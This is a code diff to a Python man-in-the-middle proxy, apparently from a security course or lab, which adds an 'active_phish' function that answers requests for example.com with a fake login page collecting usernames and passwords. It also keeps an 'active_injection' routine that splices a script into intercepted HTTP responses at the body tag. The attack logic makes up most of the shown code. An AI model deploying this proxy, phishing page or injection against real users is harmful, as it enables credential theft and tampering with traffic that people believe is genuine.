@@ -175,8 +175,7 @@ def active_scan(data, packet_type):
 
             with open('info_2.txt', 'a+') as file:
                 pprint(intel, stream=file, indent=4, sort_dicts=False)  
-
-
+            
 def active_injection(data):
     if b"<body>" in data:
         front, back = data.split(b"<body>", 1)
@@ -185,6 +184,18 @@ def active_injection(data):
         injection = data
     
     return injection
+
+def active_phish(data, client_socket):
+    method, parsed_url = parse_http_request_line(data)
+    
+    if parsed_url.hostname == "example.com":
+        client_socket.send(phish)
+        client_socket.close()
+        return True
+    else:
+        return False
+
+
 
 ################################################## Debugging
 
@@ -196,7 +207,7 @@ def observe_request(request_data, host, port):
     if args.listen_mode == 'passive':
         passive_scan(request_data, 'request')
     elif args.listen_mode == 'active':
-        # print(request_data)
+        print(request_data)
         active_scan(request_data, 'request')
 
 def observe_response(response_data, host, port):
@@ -229,6 +240,13 @@ def handle_client(client_socket, addr):
     target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     target_socket.connect((target_hostname, target_port))
 
+    
+    if args.listen_mode == 'active':
+        print("got here")
+        rightHost = active_phish(client_data, client_socket)
+        if rightHost:
+            return
+
     try:
         while True:
             # send client data
@@ -243,7 +261,6 @@ def handle_client(client_socket, addr):
                     target_data = active_injection(target_data)
                 observe_response(target_data, target_hostname, target_port)
 
-
             # send target data
             client_socket.send(target_data)
 
@@ -252,9 +269,8 @@ def handle_client(client_socket, addr):
             if client_data == b'':
                 break
             else:
-                if args.listen_mode == 'active':
-                    target_data = active_injection(target_data)
                 observe_request(client_data, client_host, client_port)
+
             
         # Close the connections
         client_socket.close()
@@ -268,9 +284,6 @@ def handle_client(client_socket, addr):
         # print("error")
         traceback.print_exc()
 
-
-
-    
 ################################################## Start up
 
 def start_proxy(listen_mode, bind_host, bind_port):
@@ -340,16 +353,13 @@ def main():
             </script>"""
     script = script.encode('utf-8')
 
-    phish = """<!DOCTYPE html>
+    phish = b"""<!DOCTYPE html>
         <html lang="en">
         <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>Login Page</title>
             <style>
                 body {
-                    font-family: Arial, sans-serif;
-                    background-color: #f4f4f4;
+                    font-family: Arial;
                     text-align: center;
                     margin-top: 50px;
                 }
@@ -358,7 +368,6 @@ def main():
                     max-width: 300px;
                     margin: auto;
                     padding: 20px;
-                    background-color: white;
                     box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                     border-radius: 5px;
                 }
@@ -371,13 +380,12 @@ def main():
                 }
 
                 .login-container button {
-                    background-color: #4caf50;
+                    background-color: green;
                     color: white;
                     padding: 10px 15px;
                     margin: 8px 0;
                     border: none;
                     border-radius: 3px;
-                    cursor: pointer;
                 }
             </style>
         </head>
@@ -385,11 +393,11 @@ def main():
             <div class="login-container">
                 <h2>Login</h2>
                 <form action="/login" method="post">
-                    <label for="username">Username:</label>
-                    <input type="text" id="username" name="username" required>
+                    <label>Username:</label>
+                    <input type="text" id="username" name="username">
 
-                    <label for="password">Password:</label>
-                    <input type="password" id="password" name="password" required>
+                    <label>Password:</label>
+                    <input type="password" id="password" name="password">
 
                     <button type="submit">Login</button>
                 </form>
